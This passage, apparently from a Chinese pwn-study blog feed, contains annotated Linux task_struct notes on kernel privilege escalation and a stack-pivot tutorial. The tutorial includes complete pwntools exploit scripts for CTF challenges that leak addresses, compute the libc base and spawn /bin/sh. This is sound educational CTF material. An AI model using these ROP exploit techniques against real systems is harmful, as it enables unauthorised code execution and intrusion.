<li><strong>个人信息</strong>: 进程 ID (PID)、状态（在干嘛）、名字。</li>
<li><strong>工作安排</strong>: 调度策略、优先级、被分配到哪个 CPU 上运行。</li>
<li><strong>资产清单</strong>: 拥有哪些内存空间 (<code>mm_struct</code>)。</li>
<li><strong>社会关系</strong>: 父进程是谁、子进程有哪些。</li>
<li><strong>权限与凭证</strong>: 用户 ID、组 ID、拥有的能力 (Capabilities)。</li>
<li><strong>随身物品</strong>: 打开了哪些文件。</li>
</ul>
<hr>
<h3 id="task-struct-核心字段功能模块化解读"><a href="#task-struct-核心字段功能模块化解读" class="headerlink" title="task_struct 核心字段功能模块化解读"></a><code>task_struct</code> 核心字段功能模块化解读</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 定义于: include/linux/sched.h</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> &#123;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 1. 进程状态与标识 (State &amp; Identification)</span></span><br><span class="line"><span class="comment">     * &quot;我是谁？我在干什么？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="keyword">volatile</span> <span class="type">long</span> state;            </span><br><span class="line">    <span class="comment">/* 任务状态: TASK_RUNNING--&gt;运行态（表示进程当前正在运行或准备运行）,</span></span><br><span class="line"><span class="comment">    TASK_INTERRUPTIBLE--&gt;可中断睡眠态（表示进程正在等待某个事件的发生，一旦事件发生或收到信号，可被唤醒继续执行）</span></span><br><span class="line"><span class="comment">    TASK_UNINTERRUPTIBLE--&gt;不可中断睡眠态（与可中断睡眠态类似，表示进程正在等待某个事件的发生，但在此状态下进程无法被信号唤醒或中断）</span></span><br><span class="line"><span class="comment">    TASK_STOPPED--&gt;停止态（表示进程已经停止运行，并没有被停止。它可能是由于接收到SIGSTOP、SIGTSTP、SIGTTIN等信号而暂停执行）</span></span><br><span class="line"><span class="comment">    TASK_TRACED--&gt;跟踪态（表示进程处于调试状态，在这种状态下，一个父进程可以听歌调用系统调用来观察和控制子进程的执行）*/</span></span><br><span class="line">    <span class="type">void</span> *<span class="built_in">stack</span>;                    </span><br><span class="line">    <span class="comment">/* 进程内核栈，Linux内核通过thread_union联合体表示进程的内核栈</span></span><br><span class="line"><span class="comment">    分配/释放内核栈：alloc_thread_info/free_thread_info*/</span></span><br><span class="line">    <span class="type">pid_t</span> pid;                      <span class="comment">/* 进程ID (Process ID) */</span></span><br><span class="line">    <span class="type">pid_t</span> tgid;                     <span class="comment">/* 线程组ID (Thread Group ID)。一个进程中所有线程的 tgid 相同。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">parent</span>;</span>     <span class="comment">/* 指向父进程的指针 */</span></span><br><span class="line">    <span class="type">char</span> comm[TASK_COMM_LEN];       <span class="comment">/* 进程名，如 &quot;bash&quot;, &quot;top&quot; */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 2. 调度信息 (Scheduling)</span></span><br><span class="line"><span class="comment">     * &quot;我该如何、以及何时使用 CPU？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="type">int</span> prio, static_prio, normal_prio; <span class="comment">/* 动态、静态、普通优先级 */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> rt_priority;         <span class="comment">/* 实时优先级 */</span></span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">sched_class</span> *<span class="title">sched_class</span>;</span> <span class="comment">/* 指向调度器类的指针 (如 CFS, FIFO, RR)。</span></span><br><span class="line"><span class="comment">                                              这是实现不同调度策略的关键，是面向对象思想的体现。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sched_entity</span> <span class="title">se</span>;</span>              <span class="comment">/* 调度实体 (Scheduling Entity)，专门用于CFS调度器。</span></span><br><span class="line"><span class="comment">                                              包含了虚拟运行时间(vruntime)等核心调度数据。*/</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> policy;                 <span class="comment">/* 调度策略 (SCHED_NORMAL, SCHED_FIFO, etc.) */</span></span><br><span class="line">    <span class="type">int</span> nr_cpus_allowed;                 <span class="comment">/* 允许在多少个CPU上运行 */</span></span><br><span class="line">    <span class="type">cpumask_t</span> cpus_allowed;              <span class="comment">/* 允许运行的CPU的位掩码 */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 3. 内存管理 (Memory Management)</span></span><br><span class="line"><span class="comment">     * &quot;我的地址空间在哪里？&quot; - 这是 Pwn 领域最关心的部分之一</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="comment">// 表示进程/线程所属的内存管理结构体，用于管理进程/线程的虚拟内存空间和页表信息</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">mm</span>;</span>             <span class="comment">/* 指向内存描述符的指针，描述了完整的用户地址空间。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> *<span class="title">active_mm</span>;</span>      <span class="comment">/* 指向当前活跃的地址空间。</span></span><br><span class="line"><span class="comment">                                         对于普通进程, mm == active_mm。</span></span><br><span class="line"><span class="comment">                                         对于内核线程, mm 为 NULL, 但它会借用上一个进程的 active_mm。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 4. 身份与凭证 (Credentials &amp; Security)</span></span><br><span class="line"><span class="comment">     * &quot;我有什么权限？&quot; - 内核提权 Pwn 的核心目标</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">cred</span> __<span class="title">rcu</span> *<span class="title">cred</span>;</span>   <span class="comment">/* 指向&quot;凭证&quot;结构体的指针 (rcu是一种高级锁)。</span></span><br><span class="line"><span class="comment">                                        cred 结构体包含了 real_uid, uid, gid, capabilities 等。</span></span><br><span class="line"><span class="comment">                                        内核提权的经典手法就是修改当前进程的 cred，</span></span><br><span class="line"><span class="comment">                                        例如调用 commit_creds(prepare_kernel_cred(0))。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 5. 进程关系 (Relationships)</span></span><br><span class="line"><span class="comment">     * &quot;我的家族树是怎样的？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">children</span>;</span>      <span class="comment">/* 我的子进程链表的头部 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">sibling</span>;</span>       <span class="comment">/* 我在父进程的 children 链表中的节点 */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">task_struct</span> *<span class="title">group_leader</span>;</span><span class="comment">/* 指向线程组的领导者（通常是主线程）*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 6. 文件系统与文件描述符 (Filesystem &amp; File Descriptors)</span></span><br><span class="line"><span class="comment">     * &quot;我打开了哪些文件？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">files_struct</span> *<span class="title">files</span>;</span>     <span class="comment">/* 指向文件描述符表的指针。</span></span><br><span class="line"><span class="comment">                                       这里包含了fd数组，记录了每个文件描述符指向哪个 `struct file`。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fs_struct</span> *<span class="title">fs</span>;</span>           <span class="comment">/* 指向文件系统信息的指针，如当前工作目录(pwd)和根目录。*/</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/*********************************************************************</span></span><br><span class="line"><span class="comment">     * 7. 信号处理 (Signal Handling)</span></span><br><span class="line"><span class="comment">     * &quot;我该如何响应信号？&quot;</span></span><br><span class="line"><span class="comment">     *********************************************************************/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">signal_struct</span> *<span class="title">signal</span>;</span>   <span class="comment">/* 指向信号描述符的指针，由线程组共享。*/</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sighand_struct</span> *<span class="title">sighand</span>;</span> <span class="comment">/* 指向信号处理函数的指针，也由线程组共享。*/</span></span><br><span class="line">    <span class="type">sigset_t</span> blocked;               <span class="comment">/* 此线程阻塞的信号掩码 (per-thread) */</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* ... 以及其他成百上千用于不同子系统（如 cgroups, namespaces, tracing 等）的字段 ... */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="如何在内核中找到当前的-task-struct？"><a href="#如何在内核中找到当前的-task-struct？" class="headerlink" title="如何在内核中找到当前的 task_struct？"></a>如何在内核中找到当前的 <code>task_struct</code>？</h3><p>你不可能去遍历所有内存来找这个结构体。内核提供了一个极其高效的宏：</p>
<p><code>current</code></p>
<p>在内核代码的任何地方，<code>current</code> 宏都会返回一个指向<strong>当前正在 CPU 上运行的进程</strong>的 <code>task_struct</code> 的指针。</p>
<p>例如，一个系统调用的代码可能是这样：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">SYSCALL_DEFINE0(getuid)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* current 指向调用 getuid() 的那个进程的 task_struct */</span></span><br><span class="line">    <span class="keyword">return</span> current-&gt;cred-&gt;uid.val;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>current</code> 的实现非常巧妙，通常是通过读取当前 CPU 的栈指针，然后进行对齐计算得到的，速度极快。</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><code>task_struct</code> 是内核数据结构的中心枢纽。它通过一系列的指针，将进程的状态、调度、内存、文件、凭证、信号等所有方面的信息全部组织和链接起来，形成了一个完整而复杂的管理体系。</p>
<p>对于 Pwn 学习者来说，理解以下几个指针指向的结构体尤为重要：</p>
<ul>
<li><strong><code>cred</code></strong>: 提权的核心目标。</li>
<li><strong><code>mm</code></strong>: 理解进程虚拟内存布局，为用户态 Pwn 和内核利用打下基础。</li>
<li><strong><code>files</code></strong>: 在一些利用场景中，可能需要操作文件描述符表（如重定向）。</li>
</ul>
<h2 id="关于slab原理源码级剖析"><a href="#关于slab原理源码级剖析" class="headerlink" title="关于slab原理源码级剖析"></a>关于slab原理源码级剖析</h2><p><a href="https://www.cnblogs.com/binlovetech/p/17434311.html">参考文章</a></p>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>kernel</tag>
      </tags>
  </entry>
  <entry>
    <title>日常笔记</title>
    <url>/2025/06/22/%E6%97%A5%E5%B8%B8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="adc99300f3d80f5461608d4aaafa47a31a678907e1cbc384ac65ba3bd22291b6"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>每日心得</title>
    <url>/2025/06/28/%E6%AF%8F%E6%97%A5%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="574eef6388de06b7f3def91e1bc60fa1823f0f53ffb1f0c29e678dae50c5334c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>study</category>
      </categories>
      <tags>
        <tag>study</tag>
      </tags>
  </entry>
  <entry>
    <title>栈迁移</title>
    <url>/2025/03/21/%E6%A0%88%E8%BF%81%E7%A7%BB/</url>
    <content><![CDATA[<p>本文讨论的原理，都是针对于32位程序的栈迁移来说的，例题里面有一道是64位的栈迁移</p>
<h3 id="1、什么是栈迁移"><a href="#1、什么是栈迁移" class="headerlink" title="1、什么是栈迁移"></a>1、什么是栈迁移</h3><p> 这里我谈谈自己的理解，简单一句话：<strong>栈迁移就是控制程序的执行流</strong>（这个换的地方既可以是bss段也可以是栈里面），此时新的问题随之产生，为什么要换个地方GetShell，这就是下一段要说的为什么要使用栈迁移。</p>
<h3 id="2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）"><a href="#2、为什么要使用栈迁移-什么时候该使栈迁移（使用栈迁移的条件）" class="headerlink" title="2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）"></a>2、为什么要使用栈迁移&amp;&amp;什么时候该使栈迁移（使用栈迁移的条件）</h3><p>言简意赅的来说，就是可溢出的长度不够用，也就是说我们要么是没办法溢出到返回地址只能溢出覆盖ebp，要么是刚好溢出覆盖了返回地址但是受payload长度限制，没办法把参数给写到返回地址后面。总之呢，就是能够溢出的长度不够，没办法GetShell，所以我们才需要换一个地方GetShell。</p>
<p> 使用栈迁移的条件：</p>
<ul>
<li>要能够溢出</li>
<li>有个可写的地方（就是你要GetShell的地方），先考虑bss段，最后再考虑写到栈中</li>
<li>可以控制sp寄存器</li>
</ul>
<h3 id="3、学习栈迁移需要自身掌握什么知识"><a href="#3、学习栈迁移需要自身掌握什么知识" class="headerlink" title="3、学习栈迁移需要自身掌握什么知识"></a>3、学习栈迁移需要自身掌握什么知识</h3><ul>
<li>需要掌握汇编基础</li>
<li>较为熟悉栈结构</li>
<li>熟悉函数调用与结束时栈的变化。</li>
</ul>
<p>如果掌握了这些知识，那么理解下面的内容就不会太费力气了。当然如果你会用gdb进行调试的话，通过自己的动手调试，你将理解的更为透彻。如果你和我当初一样，也是对栈迁移一无所知，那么希望你可以仔细阅读下面的内容，我会帮你彻底理解它。</p>
<h3 id="4、栈迁移的原理"><a href="#4、栈迁移的原理" class="headerlink" title="4、栈迁移的原理"></a>4、栈迁移的原理</h3><h5 id="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例"><a href="#ebp和ebp的内容是两码事（它们二者的关系就如同c语言中-指针p与-p的关系），以下图为例" class="headerlink" title="ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例"></a>ebp和ebp的内容是两码事（它们二者的关系就如同c语言中,指针p与*p的关系），以下图为例</h5><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">0e:0038│ ebp 0xffffd0c8 —▸ 0xffffd0d8 —▸ 0xf7ffd020 (_rtld_global) —▸ 0xf7ffda40 ◂— 0</span><br></pre></td></tr></table></figure>



<p> ebp是0xffffd0c8，它的内容是0xffffd0d8，而这个内容也是一个地址，这个地址里面装的又是0xf7ffd020。ebp本身大部分时候都是一个地址（程序正常运行情况下），而ebp的内容可以是地址，也可以不是地址（程序正常运行下，ebp的内容也装的是地址，但如果你进行溢出的话，自然可以不装成地址）。我这里想强调的是<em><strong>ebp和ebp的内容这两者一定不能混为一谈</strong></em>，在阅读下面的内容是，一定要注意区分两者。</p>
<h3 id="栈迁移的核心，就在于两次的leave-ret指令上面"><a href="#栈迁移的核心，就在于两次的leave-ret指令上面" class="headerlink" title="栈迁移的核心，就在于两次的leave;ret指令上面"></a><strong>栈迁移的核心，就在于两次的leave;ret指令上面</strong></h3><p> leave指令即为mov esp ebp;pop ebp先将ebp赋给esp，此时esp与ebp位于了一个地址，你可以现在把它们指向的那个地址，即当成栈顶又可以当成是栈底。然后pop ebp，将<strong>栈顶的内容</strong>弹入ebp（此时栈顶的内容也就是ebp的内容，也就是说现在把ebp的内容赋给了ebp）。因为esp要时刻指向栈顶，既然栈顶的内容都弹走了，那么esp自然要往下挪一个内存单元。具体实现请见下图：</p>
<img data-src="../images/image-20241120213824271.png" alt="image-20241120213824271" style="zoom:50%;" />

<p> ret指令为pop eip，这个指令就是把栈顶的内容弹进了eip（就是下一条指令执行的地址）具体实现请见下图：</p>
<p><img data-src="/../images/2706180-20220118102755803-79970067.png" alt="2706180-20220118102755803-79970067"></p>
<p>若这个ret_address为<code>leave;ret</code>且<code>fake_frame</code>为我们精心构造的栈帧，就可以实现将esp寄存器也迁移到我们精心构造的栈帧，从而实现get_shell等操作，具体实现请见下图：</p>
<p><img data-src="/../images/image-20241120220941300.png" alt="image-20241120220941300"></p>
<p>栈迁移的例题有以下几种：</p>
<p>攻防世界上的greeting-150</p>
<p>BUUCTF上的[Black Watch 入群题]</p>
<p>BUUCTF上的ciscn_2019_es_2</p>
<p>BUUCTF上的gyctf_2020_borrowstack</p>
<p> 它们考察了在迁移到栈，迁移到bss段，从main函数结束时迁移，从main函数调用的函数结束时迁移，和64位的栈迁移以及ret2csu。</p>
<h1 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h1><h2 id="ciscn-2019-es-2"><a href="#ciscn-2019-es-2" class="headerlink" title="ciscn_2019_es_2"></a>ciscn_2019_es_2</h2><p>拖入ida中反编译如下，32位只有NX保护：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome, my friend. What&#x27;s your name?&quot;</span>);</span><br><span class="line">  vul();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">vul</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">40</span>]; <span class="comment">// [esp+0h] [ebp-28h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(s, <span class="number">0</span>, <span class="number">0x20u</span>);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">  read(<span class="number">0</span>, s, <span class="number">0x30u</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;Hello, %s\n&quot;</span>, s);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">hack</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;echo flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>大概思路就是，我们要用第一个read来泄露下ebp的地址**（因为是printf来打印字符串，参数是%s，因此是遇见00才停止打印，只要我们第一次read正好输入0x28个字符，那就没有地方在填上00了（read读入之后，会自动补充00），因此就可以把下面的ebp地址给打印出来了）**，然后第二个read用来填充我们构造的system函数以及参数（我们这次是转移到了栈中，也就是第一次read读入s的地方），</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">                   <span class="comment">#bin_sh的指针         #填充够0x28 |  ebp    |    ret              </span></span><br><span class="line">|system@plt|p32(<span class="number">0</span>)|p32(buf+<span class="number">12</span>)|/<span class="built_in">bin</span>/sh\x00|\x00...|p32(buf-<span class="number">4</span>)|p32(leave_ret)</span><br></pre></td></tr></table></figure>

<p>参数分布参考上图</p>
<p>后面的p32(buf-4) + p32(leave) p32(buf-4) 是将ebp覆盖成buf的地址-4 为什么要-4？这是因为我们利用的是两个leave，但是第二个 leave的pop ebp，在出栈的时候会esp+4。就会指向esp+4的位置， p32(leave) ,将返回地址覆盖成leave 到这里，我们成功将栈劫持到了我们的buf处，接下来就会执行栈里的内容 完整exp见解题过程。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>, arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28649</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">leave_ret = <span class="number">0x08048562</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">38</span> + <span class="string">b&#x27;b&#x27;</span>*<span class="number">2</span></span><br><span class="line">s(payload)</span><br><span class="line">ru(<span class="string">b&#x27;aabb&#x27;</span>)</span><br><span class="line">ebp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">lg(<span class="string">&quot;ebp&quot;</span>,ebp)</span><br><span class="line">sh = ebp-<span class="number">0x38</span>+<span class="number">16</span></span><br><span class="line">rop = flat([<span class="number">0</span>,elf.plt[<span class="string">&#x27;system&#x27;</span>],<span class="number">0</span>,sh,<span class="string">b&#x27;/bin&#x27;</span>,<span class="string">b&#x27;/sh\x00&#x27;</span>])</span><br><span class="line">payload = rop.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(ebp-<span class="number">0x38</span>) + p32(leave_ret)</span><br><span class="line">s(payload)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>



<h2 id="hitcon-lab"><a href="#hitcon-lab" class="headerlink" title="hitcon lab"></a>hitcon lab</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span></span><br><span class="line"><span class="comment">#context(log_level=&#x27;debug&#x27;, arch=&#x27;i386&#x27;, os=&#x27;linux&#x27;)</span></span><br><span class="line"></span><br><span class="line">file_name = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;G&#x27;</span>]:</span><br><span class="line">	p = remote(<span class="string">&#x27;192.168.6.128&#x27;</span>, <span class="number">8888</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = process(file_name)</span><br><span class="line">elf = ELF(file_name)</span><br><span class="line">libc = elf.libc</span><br><span class="line"><span class="comment">#libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim, data        :p.sendafter(delim, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim, data        :p.sendlineafter(delim, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num=<span class="number">4096</span>           :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims             :p.recvuntil(delims)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name, addr         :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">lg      = <span class="keyword">lambda</span> address, data      :log.success(<span class="string">&#x27;%s:   &#x27;</span> % (address) + <span class="built_in">hex</span>(data))</span><br><span class="line"></span><br><span class="line">buf = <span class="number">0x804ae00</span></span><br><span class="line">buf2 = buf+<span class="number">0x200</span></span><br><span class="line"><span class="comment">#这两个buf是data段靠后的那一块任取的	</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave_ret = <span class="number">0x08048504</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">40</span></span><br><span class="line"></span><br><span class="line">rop = flat([buf,read_plt,leave_ret,<span class="number">0</span>,buf,<span class="number">0x100</span>])</span><br><span class="line">payload += rop</span><br><span class="line">s(payload)</span><br><span class="line">time.sleep(<span class="number">0.1</span>)</span><br><span class="line">pop1ret = <span class="number">0x0804836d</span></span><br><span class="line">rop2 = flat([buf2,elf.plt[<span class="string">&#x27;puts&#x27;</span>],pop1ret,elf.got[<span class="string">&#x27;puts&#x27;</span>],read_plt,leave_ret,<span class="number">0</span>,buf2,<span class="number">0x100</span>])</span><br><span class="line">sl(rop2)</span><br><span class="line"><span class="built_in">print</span>(p.recvline())</span><br><span class="line">puts = u32(p.recvline().strip())</span><br><span class="line">lg(<span class="string">&#x27;puts&#x27;</span>,puts)</span><br><span class="line">libc_base = puts - <span class="number">0x732a0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system = libc_base + <span class="number">0x48170</span></span><br><span class="line">sh = buf2 + <span class="number">16</span></span><br><span class="line">gdb.attach(p)</span><br><span class="line">rop3 = flat([buf,system,<span class="number">0</span>,sh,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>])</span><br><span class="line">sl(rop3)</span><br><span class="line">itr()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>pwn</category>
      </categories>
      <tags>
        <tag>pwn</tag>
        <tag>stack</tag>
      </tags>
  </entry>
  <entry>
    <title>有用的东西</title>
    <url>/2025/04/15/%E8%B5%84%E6%96%99/</url>
    <content><![CDATA[<p><a href="https://blog.csdn.net/Breeze_CAT/article/details/103789233">[pwn]调试：gdb+pwndbg食用指南</a></p>
<p> <a href="https://roderickchan.github.io/zh-cn/2023-03-01-analysis-of-glibc-heap-exploitation-in-high-version/">Glibc高版本堆利用方法总结</a></p>
